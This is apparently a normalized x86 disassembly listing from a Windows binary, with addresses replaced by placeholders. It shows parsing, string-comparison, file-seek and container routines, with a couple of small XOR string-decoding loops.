lea ecx [ ebp + 0xc ]
call sub_1001f91c
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005f5ef
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov edi [ ebp + 0x24 ]
add edi 0x10
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1002f3fc
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1002f3fc
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005f5ef
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x14 ]
cmp [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005f5ef
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
mov edi [ ebp + 0x24 ]
add edi 0x10
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1002f3fc
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
cmp [ ebp - 0x4 ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1002f3fc
add esp 0x18
or [ esi ] eax
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x14 ]
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov edi [ ebp + 0x24 ]
add edi 0x10
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1002f3fc
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1002f3fc
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
sub_10039973
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov ecx [ ecx ]
cmp ecx [ eax ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_100399a0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
push edi
inc eax
push eax
push ecx
call sub_10013bb0
mov edx [ esi + 0x4 ]
mov edi eax
mov eax [ esi ]
push edx
push eax
push edi
call sub_1007f580
mov ecx [ esi + 0x4 ]
add esp 0x14
mov [ edi + ecx ] 0x0
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_100399e0
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push edi
mov edi eax
mov eax [ edi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
call sub_10060030
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
push edx
lea edx [ ebp - 0x4 ]
push edx
push edi
call sub_10017710
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0x8 ] ecx
jmp r-xdata
lea esp [ esp ]
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_10039a80
push ebp
mov ebp esp
shr eax 0x1
mov ecx 0x0
je r-xdata
mov ecx 0x80070057
cmp eax 0x7fffffff
jbe r-xdata
mov eax ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push edi
lea esi [ eax - 0x1 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push ebx
xor edi edi
call sub_10069907
add esp 0x10
test eax eax
js r-xdata
test ecx ecx
js r-xdata
xor eax eax
mov [ ebx + esi * 2 ] ax
mov edi 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
xor edx edx
mov eax edi
pop edi
mov [ ebx + esi * 2 ] dx
pop esi
pop ebp
retn
sub_10039ae0
push ebp
mov ebp esp
and esp 0xfffffff8
and eax 0x17
sub esp 0x18
mov [ ecx + 0xc ] eax
mov ecx [ ecx + 0x10 ]
and ecx eax
push esi
push edi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov esi 0x1
test cl 0x4
je r-xdata
push 0x0
push 0x0
call sub_10055e2a
test cl 0x2
je r-xdata
call sub_1000f45b
mov edi eax
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0xc ] r--data
call sub_10032538
push r--data
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] r--data
call sub_10055e2a
call sub_1000f45b
lea ecx [ esp + 0x8 ]
push ecx
lea ecx [ esp + 0x10 ]
mov edi eax
mov [ esp + 0xc ] r--data
call sub_10032538
push r--data
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] r--data
call sub_10055e2a
call sub_1000f45b
lea edx [ esp + 0x8 ]
push edx
lea ecx [ esp + 0x10 ]
mov edi eax
mov [ esp + 0xc ] r--data
call sub_10032538
push r--data
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] r--data
call sub_10055e2a
sub_10039bd6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_10029d20
pop ecx
test eax eax
je r-xdata
push esi
call sub_10083737
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_10063a9a
push eax
call sub_1000fb4a
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_10039c20
push ebp
mov ebp esp
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ r--data ]
mov [ ebp - 0x220 ] eax
movsx eax [ edx ]
push ebx
push esi
xor eax 0xffae
push edi
mov edi [ rw-data ]
mov [ ebp - 0x21c ] ecx
xor ecx ecx
and eax 0xff
mov [ ebp - 0x218 ] ax
mov [ ebp - 0x216 ] cx
cmp [ edi + 0x120 ] ecx
je r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x208
push ecx
lea edx [ ebp - 0x210 ]
push edx
call sub_1007f8f0
lea eax [ ebp - 0x214 ]
add esp 0xc
push eax
call sub_10026420
mov ecx [ ebp - 0x214 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x214 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ebx [ ecx + edx + 0x1082c ]
mov ecx 0x104
lea eax [ ebp - 0x210 ]
xor esi esi
lea esp [ esp ]
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x210 ]
push ebx
mov edx 0x7fffffff
call sub_10072780
lea eax [ ebp - 0x218 ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea ecx [ ebp - 0x214 ]
push ecx
call sub_10026420
mov ecx [ ebp - 0x214 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x214 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea eax [ ecx + edx + 0x11c7c ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x210 ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ ebp - 0x218 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x210 ]
call sub_10050c60
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
lea ecx [ ebp - 0x210 ]
push ecx
mov ecx [ ebp - 0x220 ]
push edx
mov edx [ ebp - 0x21c ]
call sub_1000da80
mov ecx [ ebp - 0x4 ]
add esp 0x8
neg eax
pop edi
sbb eax eax
pop esi
xor ecx ebp
and eax 0x4
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10039e10
push ebp
mov ebp esp
push ecx
xor eax eax
push ebx
mov ebx [ esi + 0xcc ]
push edi
mov edi [ esi + 0xd0 ]
mov [ esi + 0xd5 ] ax
mov [ esi + 0xd8 ] eax
mov [ esi + 0xdc ] eax
mov [ esi + 0xe0 ] eax
lea eax [ esi + 0x94 ]
push eax
lea ecx [ esi + 0x78 ]
push ecx
lea eax [ esi + 0x5c ]
push eax
movzx eax [ esi + 0x3c ]
lea ecx [ esi + 0x40 ]
push ecx
push eax
lea ecx [ esi + 0x4 ]
push ecx
mov ecx [ ebp + 0x8 ]
lea edx [ esi + 0xb0 ]
call sub_10049d80
add esp 0x18
mov [ esi + 0xec ] eax
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
call eax
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
push esi
call sub_1003b080
test eax eax
je r-xdata
mov eax 0x1
pop edi
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x0
mov eax 0x1f4
mov edi esi
mov [ esi + 0xd5 ] 0x1
call sub_10057bc0
push ebx
push 0x1
push esi
mov [ esi + 0xd8 ] eax
call sub_1003b080
test eax eax
jne r-xdata
mov ecx [ esi + 0xec ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
call eax
mov ecx [ esi + 0xec ]
test ecx ecx
je r-xdata
pop edi
mov [ esi + 0xe4 ] ebx
mov [ esi + 0xd4 ] 0x1
xor eax eax
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x1
mov eax 0x7d0
mov [ esi + 0xd6 ] 0x1
mov [ esi + 0xe0 ] 0x1
call sub_10057bc0
mov [ esi + 0xdc ] eax
mov [ esi + 0xec ] 0x0
mov eax 0x2
pop edi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
sub_10039f2f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10041241
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_1005b670
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_1005bae3
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_10039fc0
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
pop esi
jmp eax
sub_1003a000
push ebp
mov ebp esp
push 0xffffffff
push sub_10088710
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x71c71c7
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_10030594
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_1006d880
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_10060d50
mov edi [ esi + 0x4 ]
mov ecx [ esi ]
mov edx edi
sub edx ecx
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov ebx edx
shr ebx 0x1f
add esp 0xc
add ebx edx
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax + eax * 8 ]
mov eax [ ebp - 0x14 ]
lea ecx [ eax + edx * 4 ]
lea edx [ ebx + ebx * 8 ]
mov [ esi + 0x8 ] ecx
lea ecx [ eax + edx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi ] eax
mov eax ecx
call sub_1006a100
mov ecx [ esi ]
push ecx
call sub_1000a86e
add esp 0x4
sub_1003a0f4
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_1003a120
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
mov ecx [ r--data ]
xor eax eax
push ebx
nop
movsx ebx [ ecx + eax ]
xor ebx eax
xor ebx 0xffed
and ebx 0xff
mov [ ebp + eax * 2 - 0x10 ] bx
inc eax
cmp eax 0x4
jb r-xdata
push edx
lea ecx [ ebp - 0x10 ]
xor eax eax
push ecx
mov [ ebp - 0x8 ] ax
call sub_1004e270
add esp 0x8
pop ebx
test eax eax
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x19
call sub_1002f620
push edi
push edx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0x129
call sub_1002f620
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x80 ]
mov eax 0x126
call sub_1002f620
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1003a1fc
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_1003a2c0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
add ecx 0x18
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
lea ebx [ ebx ]
mov [ edi ] ax
inc esi
add edi 0x2
cmp esi ebx
jne r-xdata
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov al [ esi ]
push ecx
lea edx [ ebp + 0x10 ]
push edx
mov [ ebp + 0x8 ] al
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
mov [ ebp + 0x10 ] 0x0
call sub_10025a12
add esp 0x14
test eax eax
mov eax 0xffff
js r-xdata
pop edi
sub_1003a33c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10028ea3
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_1003a370
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
mov [ esi ] r--data
test eax eax
jle r-xdata
jns r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_1001b2d2
jmp r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
push ecx
call sub_10019274
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_1003a3f0
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ecx ]
mov eax [ eax + 0x1c ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
push esi
call eax
mov eax esi
mov esp ebp
pop ebp
retn 0x10
sub_1003a417
push 0x20
mov eax sub_10085d93
call sub_10047689
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_10016af3
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1000838d
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_10069470
mov eax edi
call sub_100262c3
retn 0x24
sub_1003a496
mov edi edi
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x14
push edi
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp + 0x1c ]
push 0x0
push 0x30
mov [ ebp - 0x3c ] ecx
call sub_10032181
add esp 0xc
push [ ebp - 0x30 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x2c ] eax
lea ebx [ ebp - 0x24 ]
call sub_1002839c
test al al
jne r-xdata
mov edi [ ebp - 0x30 ]
push edi
mov ecx esi
mov [ ebp - 0x25 ] 0x0
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push edi
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push edi
push 0x0
push 0x2b
mov [ ebp - 0x34 ] eax
call sub_10032181
add esp 0xc
cmp [ ebp - 0x34 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov ax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x2c ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_100255aa
lea eax [ ebp - 0x38 ]
push eax
push 0xa
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x24 ]
xor edi edi
push eax
mov [ ebx ] 0x0
mov [ ebp - 0x38 ] edi
call sub_1000c882
add esp 0x10
push [ ebp - 0x30 ]
mov ecx esi
mov ebx eax
call sub_1002839c
test al al
je r-xdata
lea ebx [ ebp - 0x24 ]
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1000eff4
push edi
mov ecx esi
call sub_1002839c
test al al
je r-xdata
movzx eax [ esi + 0x6 ]
push edi
push 0x0
push 0x2d
mov [ ebp - 0x34 ] eax
call sub_10032181
add esp 0xc
cmp [ ebp - 0x34 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
mov ecx esi
lea ebx [ ebp - 0x23 ]
call sub_1000eff4
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
inc edi
mov [ ebx ] 0x30
inc ebx
jmp r-xdata
mov [ ebp - 0x24 ] 0x2d
movzx eax [ ebp - 0x2c ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_100255aa
or edi 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp ebx [ ebp + 0x14 ]
jl r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x2c ]
add al 0x30
mov [ ebx ] al
lea eax [ ebp - 0x5 ]
cmp ebx eax
jae r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp + 0x18 ] ebx
jl r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1000eff4
inc ebx
mov eax [ ebp - 0x3c ]
mov [ eax ] ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
sub_1003a66a
